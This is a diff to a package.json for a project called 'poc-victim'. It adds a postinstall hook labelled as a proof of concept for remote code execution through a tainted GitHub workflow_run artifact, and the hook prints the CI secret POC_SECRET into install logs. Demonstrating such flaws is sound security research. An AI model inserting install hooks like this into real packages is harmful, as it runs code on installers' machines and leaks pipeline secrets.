@@ -1,1 +1,8 @@
-{"name":"poc-victim","version":"1.0.0","scripts":{"build":"echo building"}}
+{
+  "name": "poc-victim",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "echo building",
+    "postinstall": "echo '[PoC] RCE via workflow_run artifact taint — POC_SECRET='$POC_SECRET"
+  }
+}
